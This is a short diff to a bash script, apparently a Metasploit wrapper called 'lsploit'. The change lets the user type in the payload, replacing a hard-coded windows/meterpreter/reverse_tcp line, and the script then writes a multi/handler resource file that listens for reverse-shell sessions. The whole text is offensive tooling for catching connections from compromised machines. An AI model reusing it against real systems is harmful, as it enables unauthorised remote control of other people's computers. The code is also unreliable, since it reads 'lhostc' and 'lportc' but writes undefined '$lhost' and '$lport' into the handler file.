@@ -182,6 +182,8 @@ function connect_exploit
 		read -e lhostc
 		echo -ne "\e[21;36mPlease enter the LPORT:\e[1;39m "
 		read -e lportc
+		echo -ne "\e[21;36mPlease enter the PAYLOAD:\e[1;39m "
+		read -e payload
 		
 		echo
 		echo -e "  \e[1;32m[+]\e[1;39m Connection starting...\e[0m"
@@ -189,7 +191,7 @@ function connect_exploit
 		
 		touch ~/.lsploit/$lhostc.rc
 		echo use exploit/multi/handler > ~/.lsploit/$lhostc.rc
-        echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/.lsploit/$lhostc.rc
+        echo set PAYLOAD $payload >> ~/.lsploit/$lhostc.rc
         echo set LHOST $lhost >> ~/.lsploit/$lhostc.rc
         echo set LPORT $lport >> ~/.lsploit/$lhostc.rc
         echo set ExitOnSession false >> ~/.lsploit/$lhostc.rc
